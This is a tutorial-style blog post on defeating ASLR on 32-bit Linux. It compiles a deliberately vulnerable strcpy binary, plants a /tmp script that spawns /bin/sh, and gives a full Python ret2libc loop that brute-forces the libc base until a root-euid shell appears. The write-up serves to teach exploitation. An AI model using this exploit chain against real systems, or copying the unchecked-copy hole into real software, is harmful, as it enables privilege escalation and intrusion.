---
layout: post
title: ASLR Bruteforce
categories: [pwn]
tags: [pwn]
description: How to defeat ASLR on a 32 bits Linux system.
---

# 1. Surroundings

```bash
$ uname -a
Linux debian 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux

$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.7 (jessie)
Release:	8.7
Codename:	jessie

$ gcc --version
gcc (Debian 4.9.2-10) 4.9.2

$ /lib32/libc.so.6 
GNU C Library (Debian GLIBC 2.19-18+deb8u7) stable release version 2.19, by Roland McGrath et al.
```

# 2. Explanation
Today I will show you a method to bruteforce the ASLR. This method is very usefull because it can bypass NX and ASLR protections together! But this method is only available in a x86 or less architecture because of the addresses lenght. The step is very similar as a Ret2libc attack but in our case we will take a LibC base reference address and loop the binary execution while the ASLR isn't set to our LibC reference's address.

# 3. Vulnerable binary

```c
#include <stdio.h>
#include <string.h>

// gcc main.c -z execstack -fno-stack-protector -m32

void print_name(char *str)
{
  char name[64];

  strcpy(name, str);
  printf("Welcome %s!", name);
}

int main(int ac, char **av)
{
  if (ac != 2)
    {
      printf("Usage : ./a.out [name]\n");
      return 1;
    }
  print_name(av[1]);
  return 0;
}
```

```bash
$ checksec --file a.out       
RELRO           STACK CANARY      NX            PIE          RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE       No RPATH   No RUNPATH   No	0		   4   a.out
```

It's a very simple peace of code with an overflow in "print_name" function.

# 4. The payload
The payload is very easy. It will look like:

```bash
+-------------------+
|      padding      |
+-------------------+
|  system address's |
+-------------------+
|   exit address's  |
+-------------------+
| /bin/sh address's |
+-------------------+
```

Well, it's a Ret2libc as we've seen in the previous article. The particularity is that we don't know any of the addresses we needed. So we first need to know the LibC address's to deduct the addresses we needed.

If we check the library addresses we can see something very interesting:

```bash
$ ldd a.out|grep libc
	libc.so.6 => /lib32/libc.so.6 (0xf757f000)

$ ldd a.out|grep libc
	libc.so.6 => /lib32/libc.so.6 (0xf75fb000)

$ ldd a.out|grep libc
	libc.so.6 => /lib32/libc.so.6 (0xf7555000)

ldd a.out|grep libc
	libc.so.6 => /lib32/libc.so.6 (0xf751e000)
```

There are only 8 bits of the Libc address's which evolves. So if we take randomly one of these addresses, there is a lot of chance that we will get it an other time!

So we've the Libc address, now we need the system/exit offset functions to add it to our base Libc address to know the final addresses function. I will use objdump to get the offsets:

```bash
$ objdump -D /lib32/libc.so.6|egrep "<exit>:|<__libc_system>:"
000311b0 <exit>:
0003e3e0 <__libc_system>:
```

It's OK for the addresses offsets. Now we need a string for the first system function argument.
To remind: 

```c
int system(const char *command);
```

We will use a little trick to do this. We will use a string from the binary section where the addresses don't change (like rodata section). The string need to end with a null byte. ('\0') I'm habits to use a common binary string in the dynstr section:

```bash
$ objdump -s a.out -j .dynstr|grep "gmon"
 804825c 5f676d6f 6e5f7374 6172745f 5f00474c  _gmon_start__.GL
```

Great, the string "\_gmon\_start\_\_" will be perfect. As this command does not exist actually, we will create it. The file "/tmp/\_gmon\_start\_\_" will contain:

```bash
#!/bin/sh
/bin/sh
```

No more or less! After did it, we set the correct right to the file and we add "/tmp" repertory to the $PATH environment variable:

```bash
chmod 777 /tmp/_gmon_start__ && PATH=$PATH:/tmp
```

As you might understand, we will execute a command we've create, named "\_gmon\_start\_\_" which will execute a /bin/sh.

It's OK for this part! The last step before writting the exploit is to get the padding. Another time thanks to objdump: 

```bash
$ objdump -D a.out|grep "<print_name>:" -A 17 -n              
372:0804845b <print_name>:
373- 804845b:	55                   	push   %ebp
374- 804845c:	89 e5                	mov    %esp,%ebp
375- 804845e:	83 ec 48             	sub    $0x48,%esp
376- 8048461:	83 ec 08             	sub    $0x8,%esp
377- 8048464:	ff 75 08             	pushl  0x8(%ebp)
378- 8048467:	8d 45 b8             	lea    -0x48(%ebp),%eax
379- 804846a:	50                   	push   %eax
380- 804846b:	e8 b0 fe ff ff       	call   8048320 <strcpy@plt>
381- 8048470:	83 c4 10             	add    $0x10,%esp
382- 8048473:	83 ec 08             	sub    $0x8,%esp
383- 8048476:	8d 45 b8             	lea    -0x48(%ebp),%eax
384- 8048479:	50                   	push   %eax
385- 804847a:	68 70 85 04 08       	push   $0x8048570
386- 804847f:	e8 8c fe ff ff       	call   8048310 <printf@plt>
387- 8048484:	83 c4 10             	add    $0x10,%esp
388- 8048487:	c9                   	leave  
389- 8048488:	c3                   	ret    
```

You can see at line 378 that our buffer is at 0x48 bytes from the base pointer. So we just need to add four bytes to this value to also erase ebp value. A little "echo" tricks to convert value from a base to another:

```bash
$ echo "ibase=16; 4C"|bc
76
```

We can now write our exploit!

# 5. The exploit
```python
#!/usr/bin/env python
# coding: utf-8

import struct
import subprocess

base = 0xf756e000           # base libc address's
system_offset = 0x0003e3e0  # system offset function
exit_offset = 0x000311b0    # exit offset function
binsh =  0x804825c          # string addresse's (_gmon_start__)

system_addr = base + system_offset # final system address's
exit_addr = base + exit_offset     # final exit address's

payload = "A" * 76
payload += struct.pack("<I",system_addr)
payload += struct.pack("<I",exit_addr)
payload += struct.pack("<I",binsh)

while (1):
    result = subprocess.call(["./a.out", payload])	
    if not result:
    	print "Done"
    	exit(0)
    else:
    	print "KO\n"
```

# 6. Exploitation
Sometimes the input/output failed, so you need to retry the exploitation to correct it.

A root shell per favor!

```bash
$ python exploit.py
...
KO

KO

KO

$ id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

Done.
